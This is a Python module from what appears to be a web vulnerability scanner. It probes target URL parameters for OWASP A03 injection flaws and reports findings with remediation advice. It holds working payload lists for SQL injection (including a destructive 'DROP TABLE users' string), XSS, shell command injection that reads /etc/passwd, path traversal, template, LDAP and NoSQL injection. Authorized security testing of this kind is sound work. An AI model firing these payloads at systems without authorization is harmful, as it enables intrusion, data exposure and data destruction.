from __future__ import annotations

from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

import requests

from modules.pipeline.brain.attack_variant_catalog import get_attack_variants
from modules.pipeline.engine.models import Evidence, EvidenceBundle, ExecutionContext, ValidationResult


SQL_ERROR_MARKERS = (
    # MySQL
    "sql syntax", "you have an error in your sql", "mysql_fetch", "warning.*mysql",
    # PostgreSQL
    "postgres", "pg_query", "pg_exec",
    # Generic
    "sqlite", "odbc", "sqlstate", "data exception",
    "quoted string not properly terminated", "wrong number of parameters",
    "unterminated quoted string", "unclosed quotation mark",
    # Oracle
    "oracle", "ora-", "not a valid month",
    # Java / Tomcat / Hibernate
    "java.sql.", "javax.persistence", "hibernateexception", "jdbc",
    "sqlexception", "org.hibernate", "com.mysql", "ibatis",
    # MSSQL
    "microsoft.*odbc", "unclosed quote",
    # Generic errors
    "syntax error", "division by zero", "invalid input syntax",
    "unknown column", "no such column", "no such table", "column.*doesn",
)

# XSS: use a unique probe string — detect reflection, not script execution
XSS_PROBE = "zntry8472xss"
XSS_DANGEROUS_CHARS = "<>\"'"
XSS_PAYLOAD = "<svg onload=alert(1)>"  # kept for browser-execution path
XSS_PAYLOADS_ADVANCED = [
    "<b>zntry8472xss_tag</b>",
    "<img src=x onerror=alert(1)>",
    "<script>alert(document.domain)</script>",
    "\"><script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
]

SQLI_PAYLOAD = "1'"
SQLI_PAYLOADS_ADVANCED = [
    "'",
    "1' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "1' AND 1=2--",
    "'; DROP TABLE users--",
    # XPath injection (for queryxpath.jsp)
    "' or '1'='1",
    "'] | //user/*['",
    "x'] | //*['",
    "' or 1=1 or 'a'='",
]

COMMAND_PAYLOAD = "||echo SECURITY_PIPELINE_A03"
COMMAND_PAYLOADS_ADVANCED = [
    "; cat /etc/passwd",
    "| id",
    "& whoami",
    "`id`",
    "$(whoami)",
]
COMMAND_MARKER = "SECURITY_PIPELINE_A03"

FILE_PAYLOAD = "../../../../etc/passwd"
FILE_MARKERS = ("root:x:0:0:", "/bin/bash", "/etc/passwd")

TEMPLATE_PAYLOAD = "{{7*7}}"
TEMPLATE_MARKERS = ("49", TEMPLATE_PAYLOAD)

LDAP_PAYLOAD = "*)(uid=*)"
LDAP_MARKERS = ("ldap error", "invalid dn", "filter error", "ldap:")

# NoSQL injection patterns
NOSQL_PAYLOADS = [
    "{'$ne': null}",
    "{\"$ne\": null}",
    "'; return true; //",
    "1; return true; //",
]

A03_COVERAGE_MARKERS = [
    "sql_injection",
    "xss_reflected_or_stored",
    "command_injection",
    "template_injection",
    "ldap_or_query_injection",
]


def _get_payload_variants() -> Dict[str, List[str]]:
    return {
        "sqli": get_attack_variants("A03", "sqli_payloads", SQLI_PAYLOADS_ADVANCED),
        "xss": get_attack_variants("A03", "xss_payloads", XSS_PAYLOADS_ADVANCED),
        "command": get_attack_variants("A03", "command_payloads", COMMAND_PAYLOADS_ADVANCED),
        "file": get_attack_variants("A03", "file_payloads", [FILE_PAYLOAD]),
        "template": get_attack_variants("A03", "template_payloads", [TEMPLATE_PAYLOAD]),
        "ldap": get_attack_variants("A03", "ldap_payloads", [LDAP_PAYLOAD]),
        "nosql": get_attack_variants("A03", "nosql_payloads", NOSQL_PAYLOADS),
    }


def _replace_query_param(url: str, key: str, value: str) -> str:
    parts = urlsplit(url)
    pairs = parse_qsl(parts.query, keep_blank_values=True)
    updated: List[Tuple[str, str]] = []
    replaced = False

    for current_key, current_value in pairs:
        if current_key == key and not replaced:
            updated.append((current_key, value))
            replaced = True
        elif current_key == key:
            continue
        else:
            updated.append((current_key, current_value))

    if not replaced:
        updated.append((key, value))

    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(updated, doseq=True), parts.fragment))


# High-priority params always tested for injection
_HIGH_PRIORITY = {
    "query", "search", "q", "s", "username", "uid", "user", "name",
    "email", "password", "id", "account", "listaccounts", "acct",
    "order", "sort", "filter", "category", "cat", "type", "content",
    "url", "redirect", "next", "return", "step", "template", "job",
}


def _candidate_params(state: Dict[str, Any], target_url: str) -> List[str]:
    # Explicit override from state
    params = state.get("injection_params")
    if isinstance(params, list) and params:
        return [p for p in params if isinstance(p, str) and p.strip()]

    # Pull from all discovered endpoints in the signal bag
    seen: set[str] = set()
    result: List[str] = []

    # First: params from the current target URL
    parsed = urlsplit(target_url)
    for key, _ in parse_qsl(parsed.query, keep_blank_values=True):
        if key and key not in seen:
            seen.add(key)
            result.append(key)

    # Second: from signal_bag param_patterns
    for p in (state.get("param_patterns") or []):
        if isinstance(p, str) and p and p not in seen:
            seen.add(p)
            result.append(p)

    # Third: params from discovered endpoints
    for ep in (state.get("endpoints") or [])[:80]:
        try:
            for key, _ in parse_qsl(urlsplit(ep).query, keep_blank_values=True):
                if key and key not in seen:
                    seen.add(key)
                    result.append(key)
        except Exception:
            pass

    if result:
        # Sort: high-priority params first
        return sorted(result, key=lambda p: (0 if p.lower() in _HIGH_PRIORITY else 1, p))

    return ["query", "q", "search", "id", "username", "uid", "name"]


class InjectionValidator:
    """OWASP A03 validator for reflected XSS and basic SQL error-based injection signals."""

    SIGNALS = {}

    def __init__(self, context: Optional[ExecutionContext] = None):
        self.context = context
        self.destructive = False

    def can_run(self, state: Dict[str, Any]) -> bool:
        url = state.get("url") or state.get("target")
        return isinstance(url, str) and url.startswith(("http://", "https://"))

    def _run_probe(self, url: str, headers: Dict[str, str], timeout: int) -> Dict[str, Any]:
        import re as _re
        response = requests.get(url, headers=headers, timeout=timeout, allow_redirects=True)
        body = response.text or ""
        lowered = body.lower()
        # SQL: regex-based matching for Java/Tomcat/Oracle patterns
        sql_error_hits = [
            marker for marker in SQL_ERROR_MARKERS
            if _re.search(marker, lowered)
        ]
        # XSS: check exact payload AND probe-based reflection
        xss_reflected = XSS_PAYLOAD in body
        command_marker_seen = COMMAND_MARKER in body
        file_marker_seen = any(marker in body for marker in FILE_MARKERS)
        template_marker_seen = any(marker in body for marker in TEMPLATE_MARKERS)
        ldap_marker_seen = any(marker in lowered for marker in LDAP_MARKERS)
        return {
            "status_code": response.status_code,
            "body": body,
            "sql_error_hits": sql_error_hits,
            "xss_reflected": xss_reflected,
            "command_marker_seen": command_marker_seen,
            "file_marker_seen": file_marker_seen,
            "template_marker_seen": template_marker_seen,
            "ldap_marker_seen": ldap_marker_seen,
            "headers": dict(response.headers),
        }

    def _confirm_xss_execution(
        self,
        probe_url: str,
        cookie: Optional[str],
        timeout: int,
        payload: str,
        browser: Any = None,
    ) -> Dict[str, Any]:
        try:
            from playwright.sync_api import TimeoutError as PlaywrightTimeoutError  # type: ignore
            from playwright.sync_api import sync_playwright  # type: ignore
        except Exception as exc:
            return {"browser_available": False, "error": f"playwright_unavailable: {exc}"}

        result: Dict[str, Any] = {"browser_available": True, "alert_seen": False, "payload": payload}
        timeout_ms = max(5000, int(timeout) * 1000)

        try:
            if browser is not None:
                context = browser.new_context(ignore_https_errors=True)
                _close_browser = False
            else:
                playwright = sync_playwright().start()
                browser = playwright.chromium.launch(headless=True)
                context = browser.new_context(ignore_https_errors=True)
                _close_browser = True
                if isinstance(cookie, str) and cookie.strip() and ";" in cookie:
                    domain = urlsplit(probe_url).hostname or "localhost"
                    cookies = []
                    for fragment in cookie.split(";"):
                        if "=" not in fragment:
                            continue
                        name, value = fragment.split("=", 1)
                        name = name.strip()
                        value = value.strip()
                        if not name:
                            continue
                        cookies.append({"name": name, "value": value, "domain": domain, "path": "/"})
                    if cookies:
                        try:
                            context.add_cookies(cookies)
                        except Exception:
                            pass

                page = context.new_page()
                page.set_default_timeout(timeout_ms)

                dialog_messages: List[str] = []

                def _on_dialog(dialog):
                    try:
                        dialog_messages.append(str(dialog.message or ""))
                        dialog.accept()
                    except Exception:
                        pass

                page.on("dialog", _on_dialog)

                try:
                    page.goto(probe_url, wait_until="networkidle", timeout=timeout_ms)
                except PlaywrightTimeoutError:
                    try:
                        page.goto(probe_url, wait_until="load", timeout=timeout_ms)
                    except Exception:
                        pass
                except Exception:
                    pass

                try:
                    page.wait_for_timeout(1000)
                except Exception:
                    pass

                result["dialog_messages"] = dialog_messages
                result["alert_seen"] = bool(dialog_messages)
                result["alert_message"] = dialog_messages[0] if dialog_messages else ""

                try:
                    context.close()
                except Exception:
                    pass

                if _close_browser:
                    try:
                        browser.close()
                    except Exception:
                        pass
                    try:
                        playwright.stop()
                    except Exception:
                        pass
        except Exception as exc:
            result["error"] = str(exc)

        return result

    def run(self, state: Dict[str, Any]):
        target_url = state.get("url") or state.get("target")
        if not isinstance(target_url, str) or not target_url:
            return None

        timeout = int(state.get("timeout", 8) or 8)
        headers = {"User-Agent": "Mozilla/5.0 (compatible; ZentryScanner/2.0)"}

        # Inject auth cookies from pre-scan authentication
        cookie = state.get("cookie")
        if isinstance(cookie, str) and cookie.strip():
            headers["Cookie"] = cookie.strip()
        auth_cookies: Dict[str, str] = state.get("auth_cookies") or {}
        if auth_cookies and "Cookie" not in headers:
            headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in auth_cookies.items())

        candidate_params = _candidate_params(state, target_url)
        variants = _get_payload_variants()
        findings: List[ValidationResult] = []

        # Build a list of (url, param) pairs — test params on their native endpoints too
        test_pairs: List[tuple] = []
        seen_pairs: set = set()
        for ep in (state.get("endpoints") or [])[:60]:
            try:
                ep_params = [k for k, _ in parse_qsl(urlsplit(ep).query, keep_blank_values=True)]
                for p in ep_params:
                    key = (urlsplit(ep).path, p.lower())
                    if key not in seen_pairs and p.lower() in _HIGH_PRIORITY:
                        seen_pairs.add(key)
                        test_pairs.append((ep, p))
            except Exception:
                pass
        for p in candidate_params[:12]:
            key = (urlsplit(target_url).path, p.lower())
            if key not in seen_pairs:
                seen_pairs.add(key)
                test_pairs.append((target_url, p))

        for target_url_i, param in test_pairs[:25]:
            baseline_url = _replace_query_param(target_url_i, param, "injection-test")

            try:
                baseline = self._run_probe(baseline_url, headers, timeout)
            except requests.RequestException:
                continue

            sqli = None
            sqli_payload_used = ""
            for payload in variants["sqli"]:
                probe_url = _replace_query_param(target_url_i, param, payload)
                try:
                    candidate = self._run_probe(probe_url, headers, timeout)
                except requests.RequestException:
                    continue
                if candidate["sql_error_hits"]:
                    sqli = candidate
                    sqli["probe_url"] = probe_url
                    sqli_payload_used = payload
                    break

            # XSS: reflection probe (not exact payload match)
            xss = None
            xss_payload_used = ""
            # Step 1: check if probe string is reflected at all
            probe_url = _replace_query_param(target_url_i, param, XSS_PROBE + XSS_DANGEROUS_CHARS)
            try:
                probe_result = self._run_probe(probe_url, headers, timeout)
                if XSS_PROBE in probe_result["body"]:
                    # Check dangerous chars unescaped
                    body = probe_result["body"]
                    idx = body.find(XSS_PROBE)
                    ctx = body[max(0, idx-100):idx+200]
                    unescaped = [c for c in ["<", ">", '"'] if c in ctx and
                                 {"<": "&lt;", ">": "&gt;", '"': "&quot;"}[c] not in ctx]
                    if unescaped:
                        probe_result["xss_reflected"] = True
                        probe_result["probe_url"] = probe_url
                        probe_result["unescaped_chars"] = unescaped
                        xss = probe_result
                        xss_payload_used = XSS_PROBE + XSS_DANGEROUS_CHARS
            except requests.RequestException:
                pass
            # Step 2: if reflection found, confirm with HTML tag
            if xss:
                tag_url = _replace_query_param(target_url_i, param, XSS_PAYLOADS_ADVANCED[0])
                try:
                    tag_result = self._run_probe(tag_url, headers, timeout)
                    if "zntry8472xss_tag" in tag_result["body"] and "<b>" in tag_result["body"]:
                        xss = tag_result
                        xss["probe_url"] = tag_url
                        xss["xss_reflected"] = True
                        xss_payload_used = XSS_PAYLOADS_ADVANCED[0]
                except Exception:
                    pass
            # Step 3: fallback — try JS payloads for exact reflection
            if not xss:
                for payload in variants["xss"]:
                    probe_url = _replace_query_param(target_url_i, param, payload)
                    try:
                        candidate = self._run_probe(probe_url, headers, timeout)
                    except requests.RequestException:
                        continue
                    if candidate["xss_reflected"]:
                        xss = candidate
                        xss["probe_url"] = probe_url
                        xss_payload_used = payload
                        break

            command = None
            command_payload_used = ""
            for payload in variants["command"]:
                probe_url = _replace_query_param(target_url_i, param, payload)
                try:
                    candidate = self._run_probe(probe_url, headers, timeout)
                except requests.RequestException:
                    continue
                if candidate["command_marker_seen"]:
                    command = candidate
                    command["probe_url"] = probe_url
                    command_payload_used = payload
                    break

            file_probe = None
            file_payload_used = ""
            for payload in variants["file"]:
                probe_url = _replace_query_param(target_url_i, param, payload)
                try:
                    candidate = self._run_probe(probe_url, headers, timeout)
                except requests.RequestException:
                    continue
                if candidate["file_marker_seen"]:
                    file_probe = candidate
                    file_probe["probe_url"] = probe_url
                    file_payload_used = payload
                    break

            template_probe = None
            template_payload_used = ""
            for payload in variants["template"]:
                probe_url = _replace_query_param(target_url_i, param, payload)
                try:
                    candidate = self._run_probe(probe_url, headers, timeout)
                except requests.RequestException:
                    continue
                if candidate["template_marker_seen"]:
                    template_probe = candidate
                    template_probe["probe_url"] = probe_url
                    template_payload_used = payload
                    break

            ldap_probe = None
            ldap_payload_used = ""
            for payload in variants["ldap"]:
                probe_url = _replace_query_param(target_url_i, param, payload)
                try:
                    candidate = self._run_probe(probe_url, headers, timeout)
                except requests.RequestException:
                    continue
                if candidate["ldap_marker_seen"]:
                    ldap_probe = candidate
                    ldap_probe["probe_url"] = probe_url
                    ldap_payload_used = payload
                    break

            if sqli and sqli["sql_error_hits"]:
                findings.append(
                    ValidationResult(
                        success=True,
                        confidence=0.92,
                        severity="high",
                        vulnerability="a03-injection-sqli",
                        evidence=Evidence(
                            request={"baseline_url": baseline_url, "probe_url": sqli.get("probe_url"), "param": param},
                            response={
                                "baseline_status": baseline["status_code"],
                                "probe_status": sqli["status_code"],
                                "sql_error_hits": sqli["sql_error_hits"],
                            },
                            matched=",".join(sqli["sql_error_hits"]),
                            extra={"param": param, "payload": sqli_payload_used, "attempted_payload_variants": variants["sqli"], "coverage_markers": A03_COVERAGE_MARKERS},
                        ),
                        evidence_bundle=EvidenceBundle(
                            raw_request=f"GET {sqli.get('probe_url')}",
                            raw_response=_clip(sqli["body"]),
                            matched_indicator=",".join(sqli["sql_error_hits"]),
                            execution_proof={"sql_error_visible": True},
                            metadata={"param": param, "probe": "sqli"},
                        ),
                        impact="The application exposed SQL error behavior in response to injected input, indicating injection risk.",
                        remediation="Use parameterized queries, input validation, and suppress detailed database errors from responses.",
                        execution_proved=False,
                    )
                )

            if xss and xss["xss_reflected"]:
                browser_confirmation = self._confirm_xss_execution(
                    xss.get("probe_url") or baseline_url,
                    state.get("cookie"),
                    timeout,
                    xss_payload_used,
                    browser=state.get("browser"),
                )
                browser_executed = bool(browser_confirmation.get("alert_seen"))
                findings.append(
                    ValidationResult(
                        success=True,
                        confidence=0.97 if browser_executed else 0.9,
                        severity="high",
                        vulnerability="a03-injection-xss",
                        evidence=Evidence(
                            request={"baseline_url": baseline_url, "probe_url": xss.get("probe_url"), "param": param},
                            response={
                                "baseline_status": baseline["status_code"],
                                "probe_status": xss["status_code"],
                                "reflected": True,
                                "browser_alert_seen": browser_executed,
                            },
                            matched=xss_payload_used,
                            extra={"param": param, "payload": xss_payload_used, "attempted_payload_variants": variants["xss"], "coverage_markers": A03_COVERAGE_MARKERS, "browser_confirmation": browser_confirmation},
                        ),
                        evidence_bundle=EvidenceBundle(
                            raw_request=f"GET {xss.get('probe_url')}",
                            raw_response=_clip(xss["body"]),
                            matched_indicator=xss_payload_used,
                            execution_proof={"payload_reflected": True, "browser_alert_seen": browser_executed, "browser_confirmation": browser_confirmation},
                            metadata={"param": param, "probe": "xss"},
                        ),
                        impact="User-controlled input is reflected without encoding, enabling client-side script execution.",
                        remediation="Encode output contextually, use templating safeguards, and add CSP defenses.",
                        execution_proved=browser_executed,
                    )
                )

            if command and command["command_marker_seen"]:
                findings.append(
                    ValidationResult(
                        success=True,
                        confidence=0.91,
                        severity="high",
                        vulnerability="a03-injection-command",
                        evidence=Evidence(
                            request={"baseline_url": baseline_url, "probe_url": command.get("probe_url"), "param": param},
                            response={
                                "baseline_status": baseline["status_code"],
                                "probe_status": command["status_code"],
                                "command_marker_seen": True,
                            },
                            matched=COMMAND_MARKER,
                            extra={"param": param, "payload": command_payload_used, "attempted_payload_variants": variants["command"], "coverage_markers": A03_COVERAGE_MARKERS},
                        ),
                        evidence_bundle=EvidenceBundle(
                            raw_request=f"GET {command.get('probe_url')}",
                            raw_response=_clip(command["body"]),
                            matched_indicator=COMMAND_MARKER,
                            execution_proof={"command_marker_seen": True},
                            metadata={"param": param, "probe": "command"},
                        ),
                        impact="The application reflected a command-execution marker, indicating possible command injection behavior.",
                        remediation="Avoid shell invocation with user input, use argument-safe subprocess APIs, and strictly validate command parameters.",
                        execution_proved=False,
                    )
                )

            if file_probe and file_probe["file_marker_seen"]:
                findings.append(
                    ValidationResult(
                        success=True,
                        confidence=0.9,
                        severity="high",
                        vulnerability="a03-injection-file",
                        evidence=Evidence(
                            request={"baseline_url": baseline_url, "probe_url": file_probe.get("probe_url"), "param": param},
                            response={
                                "baseline_status": baseline["status_code"],
                                "probe_status": file_probe["status_code"],
                                "file_marker_seen": True,
                            },
                            matched=",".join([marker for marker in FILE_MARKERS if marker in file_probe["body"]]) or FILE_PAYLOAD,
                            extra={"param": param, "payload": file_payload_used, "attempted_payload_variants": variants["file"], "coverage_markers": A03_COVERAGE_MARKERS},
                        ),
                        evidence_bundle=EvidenceBundle(
                            raw_request=f"GET {file_probe.get('probe_url')}",
                            raw_response=_clip(file_probe["body"]),
                            matched_indicator="file_read_marker",
                            execution_proof={"file_marker_seen": True},
                            metadata={"param": param, "probe": "file"},
                        ),
                        impact="The application appears to expose local file content or file-read indicators through user-controlled input.",
                        remediation="Reject path traversal input, canonicalize file paths, and restrict file access to allowlisted resources.",
                        execution_proved=False,
                    )
                )

            if template_probe and template_probe["template_marker_seen"]:
                findings.append(
                    ValidationResult(
                        success=True,
                        confidence=0.88,
                        severity="high",
                        vulnerability="a03-injection-template",
                        evidence=Evidence(
                            request={"baseline_url": baseline_url, "probe_url": template_probe.get("probe_url"), "param": param},
                            response={
                                "baseline_status": baseline["status_code"],
                                "probe_status": template_probe["status_code"],
                                "template_marker_seen": True,
                            },
                            matched=template_payload_used,
                            extra={"param": param, "payload": template_payload_used, "attempted_payload_variants": variants["template"], "coverage_markers": A03_COVERAGE_MARKERS},
                        ),
                        evidence_bundle=EvidenceBundle(
                            raw_request=f"GET {template_probe.get('probe_url')}",
                            raw_response=_clip(template_probe["body"]),
                            matched_indicator=template_payload_used,
                            execution_proof={"template_marker_seen": True},
                            metadata={"param": param, "probe": "template"},
                        ),
                        impact="The application appears to process template syntax or reflect a template evaluation marker.",
                        remediation="Do not evaluate user input in template engines and escape template delimiters before rendering.",
                        execution_proved=False,
                    )
                )

            if ldap_probe and ldap_probe["ldap_marker_seen"]:
                findings.append(
                    ValidationResult(
                        success=True,
                        confidence=0.86,
                        severity="high",
                        vulnerability="a03-injection-ldap",
                        evidence=Evidence(
                            request={"baseline_url": baseline_url, "probe_url": ldap_probe.get("probe_url"), "param": param},
                            response={
                                "baseline_status": baseline["status_code"],
                                "probe_status": ldap_probe["status_code"],
                                "ldap_marker_seen": True,
                            },
                            matched=ldap_payload_used,
                            extra={"param": param, "payload": ldap_payload_used, "attempted_payload_variants": variants["ldap"], "coverage_markers": A03_COVERAGE_MARKERS},
                        ),
                        evidence_bundle=EvidenceBundle(
                            raw_request=f"GET {ldap_probe.get('probe_url')}",
                            raw_response=_clip(ldap_probe["body"]),
                            matched_indicator=ldap_payload_used,
                            execution_proof={"ldap_marker_seen": True},
                            metadata={"param": param, "probe": "ldap"},
                        ),
                        impact="The application appears to surface LDAP filter errors or process LDAP-like injection input unsafely.",
                        remediation="Use strict LDAP escaping and parameter binding for directory queries.",
                        execution_proved=False,
                    )
                )

            if findings:
                return findings if len(findings) > 1 else findings[0]

        return ValidationResult(
            success=False,
            confidence=0.0,
            severity="info",
            vulnerability="a03-injection",
            evidence=Evidence(
                request={"target": target_url, "params": candidate_params},
                response={"status": "no_confirmed_injection"},
                matched="",
                extra={"candidate_params": candidate_params, "coverage_markers": A03_COVERAGE_MARKERS},
            ),
            impact="No injection behavior was confirmed by the available external probes.",
            remediation="Keep injection protections in place and add regression tests for all user-controlled parameters.",
        )


def _clip(value: str, limit: int = 4000) -> str:
    if len(value) <= limit:
        return value
    return value[: limit - 3] + "..."
